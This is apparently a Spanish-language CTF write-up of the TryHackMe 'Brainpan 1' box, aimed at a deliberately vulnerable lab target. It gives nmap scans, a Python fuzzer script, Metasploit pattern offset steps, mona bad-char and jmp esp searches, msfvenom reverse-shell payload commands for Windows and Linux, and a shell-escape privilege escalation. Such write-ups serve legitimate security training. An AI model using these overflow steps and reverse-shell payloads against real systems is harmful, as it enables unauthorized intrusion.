---
title:  "Brainpan 1 - Writeup - Tryhackme"
categories: 
  - Tryhackme
tags:
  - Buffer Overflow
  - Windows
  - eCPPT
  - OSCP
toc: true
toc_label: "Tabla de contenido"
---

## Puertos
```bash
# Nmap 7.91 scan initiated Mon Oct  4 08:54:10 2021 as: nmap -sS --min-rate 200 -p- --open -n -v -Pn -oN puertos 10.10.5.133
Nmap scan report for 10.10.5.133
Host is up (0.22s latency).
Not shown: 45093 closed ports, 20440 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Oct  4 08:56:58 2021 -- 1 IP address (1 host up) scanned in 168.16 seconds
```

## serviciosversiones
```bash
# Nmap 7.91 scan initiated Mon Oct  4 08:18:46 2021 as: nmap -sV -sC -p9999,10000 -oN serviciosVersiones 10.10.5.133
Nmap scan report for 10.10.5.133
Host is up (0.19s latency).

PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=10/4%Time=615AFF49%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  4 08:20:09 2021 -- 1 IP address (1 host up) scanned in 82.36 seconds

```
# puerto 10000

![Puerto 10000](/assets/images/port1000.png)

# Fuzzing
```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.5.133:10000/FUZZ
```
![Fuzzing puerto 10000](/assets/images/fuzzingport10000.png)
# brainpan.exe
source: http://10.10.5.133:10000/bin/
![Brainpan executable](/assets/images/brainpanexe.png)
# Transfer file
```bash
smbserver.py share . -smb2support -username jch -password password123
```
![Transfer Brainpan executable](/assets/images/transferbrainpain.png)

![Immunity Brainpan executable](/assets/images/immunityBrain.png)

# Fuzzer.py
```python
#!/usr/bin/python3

import socket, signal, sys, time
from pwn import *

def def_handler(sig, frame):
	print ("\n\n[!]Saliendo...!!\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len (sys.argv) < 3:
	print ("\n\n[!] Uso: pyhton3" + sys.argv[0] + "<ip> <port>\n")
	sys.exit(1)

ipAdd = sys.argv[1]
port = sys.argv[2]

if __name__=='__main__':

	buffer = ["A"]
	counter = 30

	while len(buffer) < 32:
		buffer.append("A"*counter)
		counter += 30

	p1 = log.progress("Enviando Payloads")

	for string in buffer:
	 p1.status("%s bytes" % len(string))
	 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	 s.connect((ipAdd, int(port)))
	 payload = bytes (string + '\r\n', "ascii")
	 s.send(payload)
	 data = s.recv(1024)

sleep(1)
```
![Fuzzer Brainpan executable](/assets/images/fuzzerpybrain.png)

# patter create
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 570
```
![Pattern create](/assets/images/offsetcalcbrain.png)
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```
![EIP control](/assets/images/eipcontrolBrain.png)
# creando directorio en mona
```bash
!mona config -set workingfolder C:\Users\jch\Desktop\%p
```
# creando bitearray
```bash
!mona bytearray -cpb "\x00"
```
![Mona Diretory Brain](/assets/images/monaDirBrain.png)
![Mona Compare Brain](/assets/images/monaCompareBrain.png)
![Mona Compare Brain](/assets/images/badCharsMona.png)
# r shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=443 EXITFUNC=thread -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
```
# jmp
```bash
!mona jmp -r esp -cpb "\x00"
```
![jmp Bain](/assets/images/jmpBrain.png)
![jmp Bain](/assets/images/rshellBrain.png)
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.94.28 LPORT=443 EXITFUNC=thread -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai -f c
```
![jmp Bain](/assets/images/brainpc.png)
# escalada
```bash
/home/anansi/bin/anansi_util
/home/anansi/bin/anansi_util manual id
!/bin/bash
```
![jmp Bain](/assets/images/escaladabrain.png)

